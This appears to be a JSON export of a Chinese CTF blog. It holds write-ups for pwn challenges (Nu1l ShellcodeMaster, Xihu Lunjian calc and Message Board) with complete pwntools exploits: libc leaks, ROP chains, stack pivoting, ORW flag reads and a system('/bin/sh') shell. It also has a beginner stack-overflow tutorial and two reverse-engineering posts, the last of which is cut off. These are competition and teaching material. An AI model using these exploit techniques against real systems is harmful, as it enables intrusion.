[{"title":"2023Nu1l纳新赛","url":"/2023/03/22/2023Nu1l%E7%BA%B3%E6%96%B0%E8%B5%9B/","content":"碎碎念比赛的时候早上瞧了一个小时然后有事出去了 没看到提示 不然可能还做的出来 但是不得不说Nu1l水平确实要求高 我还没远远不够\nhint1: `movq rsp, xmm2`hint2: 利用 `shellcode` 构造自己的 `gadget` 转为 `ROP`\n思路分析保护全开 环境是2.31开启了沙盒ida打开看一看\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  void *buf; // [rsp+8h] [rbp-8h]  init(argc, argv, envp);  sandbox();  buf = mmap((void *)0x2023000, 0x1000uLL, 7, 34, -1, 0LL);  puts(&quot;Try to ORW in limited bytes!&quot;);  read(0, buf, 0x11uLL);  puts(&quot;Hope that works~&quot;);  mprotect(buf, 0x1000uLL, 4);  JUMPOUT(0x2023000LL);&#125;\n总体的思路非常简单 read往0x2023000读入0x11字节的shellcode 随后mprotect把0x2023000对应的页调为可读可写不可执行 随后jmp过去 在栈帧结束的时候 各个寄存器的值都被设置成了2023\n.text:0000000000000C88                 mov     r15, 2023000h.text:0000000000000C8F                 mov     rax, 2023h.text:0000000000000C96                 mov     rbx, 2023h.text:0000000000000C9D                 mov     rcx, 2023h.text:0000000000000CA4                 mov     rdx, 2023h.text:0000000000000CAB                 mov     rsp, 2023h.text:0000000000000CB2                 mov     rbp, 2023h.text:0000000000000CB9                 mov     rsi, 2023h.text:0000000000000CC0                 mov     rdi, 2023h.text:0000000000000CC7                 mov     r8, 2023h.text:0000000000000CCE                 mov     r9, 2023h.text:0000000000000CD5                 mov     r10, 2023h.text:0000000000000CDC                 mov     r11, 2023h.text:0000000000000CE3                 mov     r12, 2023h.text:0000000000000CEA                 mov     r13, 2023h.text:0000000000000CF1                 mov     r14, 2023h\n0x11肯定不够写 我们不仅要构造mprotect调权限 还要构造read写入orw先来看一下提示吧  movq rsp, xmm2  xmm2是浮点数寄存器 将其值赋给rsp寄存器 为什么这么干?看一看xmm2中存的是什么欸 有一个libc地址 那么想的是构造write函数泄露基址 但是直接赋值給rsi寄存器是不行的因为我们还需要构造rop链 rop链要么就是劫持程序执行流 要么就是写shellcode 然后要求对应地址有可执行权限 后者显然是不行的 所以要利用rsp指针在libc地址执行rop链 调用了mprotect函数后我们再迁移到0x2023000写rop那么总结一下思路 我们要利用17字节的shellcode 做到write基址 read读入rop链 显然是捉襟见肘 这里学习了这位师傅的方法 实在有点大开眼界2023 N1CTF Junior Pwn ShellcodeMaster - Wings 的博客 (wingszeng.top)\n    movq rsp,xmm2    push rsp    pop rsil:    shr edi, 13    and eax, edi    syscall    jnz l    ret\n利用push和pop来实现寄存器互传参 shr指令是逻辑右移 这样edi就只剩下1了随后利用and指令 将eax和edi进行逻辑与操作 并将结果赋值给eax 也就是1  并且此时运算结果不为0 ZF标志位为0随后sys call系统调用就可以执行write函数 泄露libc基址 随后Jnz根据ZF标准位 为1 所以跳转再次逻辑右移 此时edi为0 and以后 结果为0 eax为0 ZF标志位为0 syscall系统调用read函数Jnz不跳转 ret指令将rsp指针指向的内容 此时是我们填入的rop链 弹入到rip寄存器 成功劫持程序执行流 听我这么说可能还是不太明白 建议自己动调一步步跟着看 另外可以看一下那位师傅的博客 里面有详细的shellcode编写思路\nio.send(asm(shellcode))libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-(0x7f009903b4c0-0x7f0098e4d000)success(&quot;libc_addr :&quot;+hex(libc_addr))mprotect_addr = libc_addr + libc.sym[&#x27;mprotect&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rdi_addr = libc_addr + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()rsi_addr = libc_addr + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()rdx_addr = libc_addr + 0x000000000011c1e1rax_addr = libc_addr + libc.search(asm(&#x27;pop rax;ret;&#x27;)).__next__()ret_addr = libc_addr + libc.search(asm(&#x27;ret;&#x27;)).__next__()syscall = libc_addr + 0x000000000002584drsp_addr = libc_addr + 0x0000000000032b5arop1 = p64(rdi_addr)+p64(0x2023000)rop1 += p64(rsi_addr)+p64(0x1000)rop1 += p64(rdx_addr)+p64(7) + p64(0)+ p64(mprotect_addr)rop1 += p64(rdi_addr)+p64(0)rop1 += p64(rsi_addr)+p64(0x2023500)rop1 += p64(rdx_addr)+p64(0x1000)+p64(0)+p64(read_addr)rop1 += p64(rsp_addr)+p64(0x2023508)io.send(rop1)\n求出libc基址以后 我们就可以构造rop链了 按照原来的思路 就是调用mprotect把0x2023000的权限开一开 然后read读入orw另外没有单独的pop_rdx指令 这里我用的是pop rdx,pop r12的然后最后就是劫持rsp 迁移到0x2023508 8字节要用来存flag字符串之所以要多0x500的话 是因为到时候栈空间不够 会跑到0x2022000这一个页 但是这个页没有可写权限 所以执行不下去 要抬高栈随后就是老一套的orw了到这里就结束了 不得不说这题出的是真的巧妙 完整exp:\nfrom pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28793)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()  io.recvuntil(&quot;Try to ORW in limited bytes!&quot;)shellcode = &quot;&quot;&quot;    movq rsp,xmm2    push rsp    pop rsil:    shr edi, 13    and eax, edi    syscall    jnz l    ret&quot;&quot;&quot;  io.send(asm(shellcode))libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-(0x7f009903b4c0-0x7f0098e4d000)success(&quot;libc_addr :&quot;+hex(libc_addr))mprotect_addr = libc_addr + libc.sym[&#x27;mprotect&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rdi_addr = libc_addr + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()rsi_addr = libc_addr + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()rdx_addr = libc_addr + 0x000000000011c1e1rax_addr = libc_addr + libc.search(asm(&#x27;pop rax;ret;&#x27;)).__next__()ret_addr = libc_addr + libc.search(asm(&#x27;ret;&#x27;)).__next__()syscall = libc_addr + 0x000000000002584drsp_addr = libc_addr + 0x0000000000032b5arop1 = p64(rdi_addr)+p64(0x2023000)rop1 += p64(rsi_addr)+p64(0x1000)rop1 += p64(rdx_addr)+p64(7) + p64(0)+ p64(mprotect_addr)rop1 += p64(rdi_addr)+p64(0)rop1 += p64(rsi_addr)+p64(0x2023500)rop1 += p64(rdx_addr)+p64(0x1000)+p64(0)+p64(read_addr)rop1 += p64(rsp_addr)+p64(0x2023508)# gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))io.send(rop1)# payload = shellcraft.open(&#x27;./flag\\x00\\x00&#x27;,0)# payload += shellcraft.read(3,0x2023100,0x30)# payload += shellcraft.write(2,0x2023100,0x30)flag_addr = 0x2023500open_addr = libc_addr + libc.sym[&#x27;open&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]payload = b&#x27;./flag\\x00\\x00&#x27;+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr+0x100) + p64(rdx_addr) + p64(0x50) + p64(0) +p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr+0x100) + p64(rdx_addr) + p64(0x50) + p64(0) +p64(write_addr)# pause()io.send(payload)io.recvuntil(&quot;flag&#123;&quot;)flag = b&#x27;flag&#123;&#x27;+io.recvuntil(&quot;&#125;&quot;)success(flag)\n\n","categories":["wp"]},{"title":"2023西湖论剑calc","url":"/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/","content":"本次wp首次尝试使用视频方式表示\n视频地址：2022西湖论剑 babycalc复现_哔哩哔哩_bilibili\nexp:\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28066)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)io.recvuntil(&quot;:&quot;)ret_addr = 0x4005b9rdi_addr = 0x400ca3rsi_r15_addr = 0x400ca1bss_addr = 0x602510rsp_r13_r14_r15_addr = 0x400c9dread_plt = 0x4005f0read_got = elf.got[&#x27;read&#x27;]puts_plt = 0x4005d0#key = p64(0xa111423746352413)+p64(0x318c77665d48332)payload = b&#x27;24&#x27;+cyclic(0x6)+p64(ret_addr)*17payload += p64(rdi_addr)+p64(0)+p64(rsi_r15_addr)+p64(bss_addr)+p64(0)+p64(read_plt)+p64(rsp_r13_r14_r15_addr)+p64(bss_addr-0x18)payload += p8(19)+p8(36)+p8(53)+p8(70)+p8(55)+p8(66)+p8(17)+p8(161)+p8(50)+p8(131)+p8(212)+p8(101)+p8(118)+p8(199)+p8(24)+p8(3)#payload += keypayload = payload.ljust(0x100-0x4,b&#x27;\\x00&#x27;)payload += p32(0x38)#gdb.attach(io,&#x27;b *0x400BB8&#x27;)io.send(payload)payload = p64(rdi_addr)+p64(read_got)+p64(puts_plt)+p64(rdi_addr)+p64(0)+p64(rsi_r15_addr)+p64(bss_addr+0x48)+p64(0)+p64(read_plt)#gdb.attach(io,&#x27;b *0x400c9d&#x27;)io.sendline(payload)read_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(read_addr))libc_addr = read_addr - libc.sym[&#x27;read&#x27;]success(hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))payload = p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.sendline(payload)io.interactive()\n\n","categories":["wp"]},{"title":"栈溢出","url":"/2022/09/15/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/","content":"继上文点到栈溢出的基础原理，本文来详细演示如何完成一题栈溢出\nchecksec的使用及保护机制了解操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险\n在我们开始尝试做题之前，我们先得知道这道题开启了哪些安全机制，我们又该如何绕过其安全机制\n这里便使用到了checksec工具\n\nArch：程序架构信息。判断是拖进64位IDA还是32位？exp编写时p64还是p32函数？\nRELRD:Relocation Read-Only (RELRO)  此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。部分RELRO 易受到攻击，例如攻击者可以atoi.got为system.plt，进而输入&#x2F;bin&#x2F;sh\\x00获得shell完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。\n（看不懂没有关系 ，后续学习将会接触到plt和got表的相关知识）\nStack：由上文可知，在我们进行栈溢出的时候，只需覆盖ret addr就能达到操控程序执行流的目的，但此项保护机制，在栈中会随机生成一段数据，在函数返回的时候，会检验这段数据是否正确，如果不正确，程序就会崩溃退出，这段数据在liunx中被称为canary\nNX:NX enabled如果这个保护开启就是意味着我们对栈中数据没有执行权限，我们无法在栈中自由更写，但是通过ROP构造执行流的办法可以绕过这个保护(同样将在接下来的学习中讲到)\nPIE:pie保护机制和ASLR相类似，我们已经知道每个数据在计算机中都有自己相应的地址，通过寻址计算机可以成功调用他们，ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 技术则在编译时将程序编译为位置无关, 即程序中的地址在每次运行时都会发生变化，我们将在后续的学习中接触到pie\nida使用和漏洞分析通过checksec我们可以得知此题为32位，我们将其拖进32位ida查看\n\n左边的function name是此二进制文件中的函数列表，通常主函数的名称是main\n右侧便为此文件的汇编代码\n我们可以按下f5进行ida反编译，将其转化为c语言代码的形式\n\nmain函数的组成相当简单，只有一个子函数shell，我们点进去看看\n\n第三行，定义了一个buf变量，那么后面的esp+0h和ebp-48h是什么意思？\n\n我们进行栈溢出的目的是为了覆盖ret addr 从而将程序的返回地址修改成我们需要的，此时read读入的变量buf的位置就是位于ebp再往上0x48处的栈顶\n所以我们可以得知，我们赋值的变量buf离ret addr差了0x48+0x4个字节\n这里为什么还要加4？如果是64位呢，还是加4吗\n我们之前说过了，一个字长对应的字节是根据位数的不同来决定的\n此时需要在0x48的数据上再加上0x4是因为我们离ret  addr还隔着一个ebp，一个字长的距离\n接下来我们看回程序，输出语句”welcome to NISACTF”\n在return处调用了函数read，读入了0x60字长的数据，而此时我们需要溢出的数据长度为0x48+0x4+0x4(我们用来覆盖ret addr的数据)\n这里就出现了栈溢出漏洞，但是此时我们还需要system(&#x2F;bin&#x2F;sh)的地址，以达到获取flag的目的\n我们可以依法炮制，翻阅其他函数的内容，我们发现这题的作者并没有直接给我们\n那么system(&#x2F;bin&#x2F;sh)就需要我们自己构造\n我们接着使用shift+f12来打开string窗口，一键找出所有的字符串\n\n我们惊喜的发现，在data段(不清楚什么是data段的，请仔细观看谢师傅的视频，为虚拟内存映射的相关知识)中存在字符串&#x2F;bin&#x2F;sh\n拥有这段字符串意味着什么？\n我们知道，函数的执行一般需要参数\n例如system(&#x2F;bin&#x2F;sh)中的&#x2F;bin&#x2F;sh便是system的参数\n所以，我们接下来的任务就是去找到system函数的地址，并且把&#x2F;bin&#x2F;sh这段字符串作为参数，就可以实现system(&#x2F;bin&#x2F;sh)\nplt表和got表这里举一个简单的例子\n某公司开发了一款软件，实现的代码调用了大量的函数，这些函数的每次实现都需要在文件(这个软件)中对应的前置来实现他\n这样子就增大了文件的体积\n但是如果将实现这些函数的前置在程序运行时载入到内存中呢？\n这样每一款软件都无需额外的内存占用，并且用户也能成功运行\n所以这里就出现了plt表和got表的概念\n\n当我们需要调用system函数时，他会去自动寻找system的plt表\n其plt表中存储了system函数的got表的地址\n其就是system在libc(libc同样在谢师傅的视频中有所介绍)中的地址\n但是我们在第一次调用system函数的时候，其got表中的地址并不知道system在libc中的哪里\n于是第一次调用无果后，system的plt表便会收到消息，去给got表找到system在libc的位置\n经过原定好的代码实现，plt表便查找到了libc中system的地址，并将其填充给了got表\n接下来plt表再去got表中，他就得知了地址，就可以成功调用system函数\n所以我们可以将整个流程用下图来展示\n\n而在之前程序已经调用了system函数进行echo 字符串，所以我们此时再去system的plt表中就能获取到system在libc中的地址\n这里你可能会无法理解，但是在初期的学习我们只需要记住，plt表是调用该函数，got表中存的地址是为了获得真实地址\n发现漏洞后，接下来就要进行shellcode的编写，开始攻击\n以下shellcode的编写需要python基础，这里同样不做解释，请自行学习）\n但我个人是没有进行任何额外的python学习(截止到我学习到堆)，不知道这条路是否合理化，请根据自己在学习中遇到的情况自行斟酌\nexp的编写\n–第二行建立与靶场的联系(概念不做解释，自行查找)的联系，名称不一定要是io，“ ”中为ip地址，逗号后为端口)\n–第三行为后续我们获得system的plt表内容的前置条件，括号中为”.&#x2F;文件名”\n–第四行，接收程序的输出内容，简单的是xxx.recv()  [xxx为你先前命名的名称，比如我的io]\nio.recv()将会接收一行的数据，以\\n为结束判定\n而io.recvuntil(“ “)将会接收到” “内的数据才停止，并且包括“ ”内的数据\n如果不想接收“ ”内的数据，可以这样编写io.recvuntil(“hello”,drop &#x3D; True)\n–第五行，为变量system_addr赋值\n赋值的内容为system的plt表中的内容\n–第六行，编写payload，cyclic创建括号内自定义字长的垃圾数据用来填充ret addr前的内容\n随后我们要注意p32()这个语法，为什么要使用它？\n首先，send系列只能传参字符串，recv接收回来的也只能是字符串，这是因为网络传输的规定!\n所以，对于地址值0x1234，就只有变成字符串传出去\n你应该也能猜到为什么是p32，64位程序使用的便是p64\n接下来我们可以理解p32(0x804a024)就是字符串&#x2F;bin&#x2F;sh的地址，那么中间的0xabcdabc又是什么？\n这里先粗略进行一个介绍，具体的介绍将在后续进行一个专门的文章(可见其中的复杂)\n我们只需要知道，正常的调用system（即非使用call system的汇编代码地址），要想成功为其传参，函数和参数之间要有一个垃圾数据\n所以他的形式可以不为abcdabc可以是任何符合格式的地址\n–第七行，发送我们构造好的payload，进行栈溢出攻击\n最后，io.interactive()来与终端交互，如果pwn成功，那么我们就可以使用ls来查看当前目录下有哪些文件\n我们利用python3（需要你的虚拟机中安装好了python3）发送这段exp试试\n\n可以看到我们输入ls后，成功列出了目录的文件，我们发现了一个名为flag的文件，那么这就是我们的最后答案了\ncat flag(liunx使用命令请自行百度) 答案到手！\n在阅读完本文后，相信你对栈溢出的解法已经有了一个大致的理解，接下来请自行前往ctfshow或者其他平台独立解题\n","categories":["栈"]},{"title":"2022西湖论剑初赛pwn-Message Board","url":"/2023/02/02/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-Message-Board/","content":"第一次在大型比赛中拿分 蛮开心的 记录一下\nchecksec看一下保护机制\n[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/xihu2&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x3ff000)    RUNPATH:  &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27;\n\n顺便用xclibc改一下libc文件 方便我们本地动态调试(这题调试十分重要)\nida分析一下伪代码\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  char *v3; // rax  char buf[8]; // [rsp+0h] [rbp-C0h] BYREF  char dest[8]; // [rsp+8h] [rbp-B8h] BYREF  char v7[176]; // [rsp+10h] [rbp-B0h] BYREF  sub_401236(a1, a2, a3);  if ( !dword_4040AC )  &#123;    strcpy(dest, &quot;Hello, &quot;);    puts(&quot;Welcome to DASCTF message board, please leave your name:&quot;);    read(0, buf, 8uLL);    dword_4040AC = 1;  &#125;  v3 = strcat(dest, buf);  printf(v3);  puts(&quot;Now, please say something to DASCTF:&quot;);  read(0, v7, 0xC0uLL);  puts(&quot;Posted Successfully~&quot;);  return 0LL;&#125;\n\nsub_401236函数清空了缓存区 顺便开了沙箱\n\nonegadget和system(“&#x2F;bin&#x2F;sh”)用不了了\n接着往下分析\n对dword_4040AC进行了if判断 如果为0就进入分支 分支最后将其值设置为1 应该是为了防止修改返回地址为main函数 从而反复利用格式化字符串漏洞\n拥有一次向buf写入0x8字节的机会\n随后将buf的内容通过strcat函数和dest字符串拼接 赋值给了v3 随后printf(v3)存在格式化字符串漏洞\n接着拥有一次栈溢出的机会 但是溢出字节数只有0x10 只够我们覆盖ret addr\n由于开启了沙盒 所以这里只能用栈迁移了 往栈上写入rop链 那么需要泄露栈地址和libc基址\n那就通过格式化字符串漏洞泄露栈地址\ngdb动调看一下偏移\n\n位于rsp+0x70处存放着栈上的地址 那么偏移为6+0x70&#x2F;8 &#x3D; 20\n泄露出来了也还没有结束 我们需要计算一下我们接下来栈溢出的变量v7在栈上的地址\n\n当前程序中我输入的v7值为aaaaaaaa  而我们泄露出来的栈地址为0x7fffffffdef0\n二者地址差值为0xd0 所以v7_addr &#x3D; stack_addr - 0xd0\nfrom pwn import*io = process(&quot;./xihu2&quot;)#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)elf = ELF(&quot;./xihu2&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io.recvuntil(&quot;Welcome to DASCTF message board, please leave your name:&quot;)payload = b&#x27;%20$p&#x27;io.send(payload)io.recvuntil(&quot;Hello, &quot;)stack_addr = int(io.recv(14),16)success(hex(stack_addr))v7_addr = stack_addr -0xd0\n\n接下来就是构造rop链 由于开启了沙盒禁用了execve 所以我们这里用orw的方法泄露flag\n但是还需要用到pop rsi pop rdx指令 显然动态链接的情况下 二进制文件中是没有这两条指令的\n所以我们还需要泄露libc基址 去libc文件中找到这两条指令\nio.recvuntil(&quot;Now, please say something to DASCTF:&quot;)rdi_addr = 0x401413puts_got = elf.got[&#x27;puts&#x27;]back_addr = 0x4012e3puts_plt = 0x4010e0leave_addr = 0x4012e1bss_addr = 0x4040B0+0x50payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(v7_addr-0x8)+p64(leave_addr)io.send(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - (0x7f5551189951-0x7f55510f9000)success(hex(libc_addr))\n\n但是这里泄露libc基址的时候 并非泄露出来的是我预想中的puts_addr\n而是_IO_do_write+177的地址 不过照样能得到libc基址就行了\n接下来就是简单的构造orw链 但是由于main函数一系列的入栈出栈操作 rsp指针的指向并不会跟我们泄露libc基址时一样\n所以我们还需要进行一次动态调试 找到我们第二次写入rop链时的栈地址\n调试exp: 虽然该exp的orw链偏移是调试后的正确结果 但是未调试时的orw链同样也可以 只是为了找到第二次写入v7的rsp指针地址\nfrom pwn import*io = process(&quot;./xihu2&quot;)#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)elf = ELF(&quot;./xihu2&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io.recvuntil(&quot;Welcome to DASCTF message board, please leave your name:&quot;)payload = b&#x27;%20$p&#x27;io.send(payload)io.recvuntil(&quot;Hello, &quot;)stack_addr = int(io.recv(14),16)success(hex(stack_addr))v7_addr = stack_addr -0xd0io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)rdi_addr = 0x401413puts_got = elf.got[&#x27;puts&#x27;]back_addr = 0x4012e3puts_plt = 0x4010e0leave_addr = 0x4012e1bss_addr = 0x4040B0+0x50payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(v7_addr-0x8)+p64(leave_addr)io.send(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - (0x7f5551189951-0x7f55510f9000)success(hex(libc_addr))io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))rsi_addr = libc_addr + 0x2601frdx_addr = libc_addr + 0x142c92open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]payload = b&#x27;/flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(stack_addr-0x170)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(stack_addr-0x170)+p64(leave_addr)gdb.attach(io,&#x27;b *0x4013A3&#x27;)io.send(payload)\n\n利用set $rsp &#x3D; $rsp - 0x30 来不断的抬高栈帧 我们可以找到我们写入的rop链\n\n于是偏移就是当前程序运行泄露的stack_addr - 0x7ffc8bf40650 &#x3D; 0x170\npayload = b&#x27;/flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(stack_addr-0x170)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(stack_addr-0x170)+p64(leave_addr)\n\n还有一点就是注意最后栈迁移的地址是rop链的起始地址减去一个字长\n而stack_addr - 0x170是&#x2F;flag字符串的地址 所以实际上rop链的起始地址是stack_addr - 0x168 \n所以覆盖old_rbp的地址应为stack_addr - 0x170\n完整exp:\nfrom pwn import*io = process(&quot;./xihu2&quot;)#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)elf = ELF(&quot;./xihu2&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io.recvuntil(&quot;Welcome to DASCTF message board, please leave your name:&quot;)payload = b&#x27;%20$p&#x27;io.send(payload)io.recvuntil(&quot;Hello, &quot;)stack_addr = int(io.recv(14),16)success(hex(stack_addr))v7_addr = stack_addr -0xd0io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)rdi_addr = 0x401413puts_got = elf.got[&#x27;puts&#x27;]back_addr = 0x4012e3puts_plt = 0x4010e0leave_addr = 0x4012e1bss_addr = 0x4040B0+0x50payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(v7_addr-0x8)+p64(leave_addr)io.send(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - (0x7f5551189951-0x7f55510f9000)success(hex(libc_addr))io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))rsi_addr = libc_addr + 0x2601frdx_addr = libc_addr + 0x142c92open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]payload = b&#x27;/flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(stack_addr-0x170)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(stack_addr-0x170)+p64(leave_addr)io.send(payload)io.recv()io.recv()\n\n","categories":["wp"]},{"title":"ACTF新生赛2020_easyre","url":"/2022/11/16/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-easyre/","content":"upx加壳 32位\n脱壳完后代码\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  _BYTE v4[12]; // [esp+12h] [ebp-2Eh] BYREF  _DWORD v5[3]; // [esp+1Eh] [ebp-22h]  _BYTE v6[5]; // [esp+2Ah] [ebp-16h] BYREF  int v7; // [esp+2Fh] [ebp-11h]  int v8; // [esp+33h] [ebp-Dh]  int v9; // [esp+37h] [ebp-9h]  char v10; // [esp+3Bh] [ebp-5h]  int i; // [esp+3Ch] [ebp-4h]  __main();  qmemcpy(v4, &quot;*F&#x27;\\&quot;N,\\&quot;(I?+@&quot;, sizeof(v4));  printf(&quot;Please input:&quot;);  scanf(&quot;%s&quot;, v6);  if ( v6[0] != &#x27;A&#x27; || v6[1] != 67 || v6[2] != 84 || v6[3] != 70 || v6[4] != 123 || v10 != 125 )    return 0;  v5[0] = v7;  v5[1] = v8;  v5[2] = v9;  for ( i = 0; i &lt;= 11; ++i )  &#123;    if ( v4[i] != _data_start__[*(v5 + i) - 1] )      return 0;  &#125;  printf(&quot;You are correct!&quot;);  return 0;&#125;\n\n注意一下数组的一个元素是四个字节 所以v5存储的是用户输入的12个字节\ndata_start_[*(v5 + i) - 1]       即用户输入的字符转化为ascii码后再-1  这个值为n v4等于 &#x3D; _data_start[n]\n所以逆向程序可以写成\na = [42,70,39,34,78,44,34,40,73,63,43,64]b = &quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;&amp;%$# !\\&quot;&quot;flag = &quot;&quot;for i in a:    flag = chr(b.find(chr(i))+1)    print(flag,end=&quot;&quot;)\n\n","categories":["reverse"]},{"title":"FlareOn4_login","url":"/2022/11/18/FlareOn4-login/","content":"题目的形式很新颖 没遇到过 就记录下来\n打开后的附件是一个网站\n要求我们输入flag 然后点击按钮进行判断\n查看一下网页的源代码\n&lt;!DOCTYPE Html /&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;FLARE On 2017&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;text&quot; name=&quot;flag&quot; id=&quot;flag&quot; value=&quot;Enter the flag&quot; /&gt;        &lt;input type=&quot;button&quot; id=&quot;prompt&quot; value=&quot;Click to check the flag&quot; /&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            document.getElementById(&quot;prompt&quot;).onclick = function () &#123;                var flag = document.getElementById(&quot;flag&quot;).value;                var rotFlag = flag.replace(/[a-zA-Z]/g, function(c)&#123;return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;);                if (&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot; == rotFlag) &#123;                    alert(&quot;Correct flag!&quot;);                &#125; else &#123;                    alert(&quot;Incorrect flag, rot again&quot;);                &#125;            &#125;        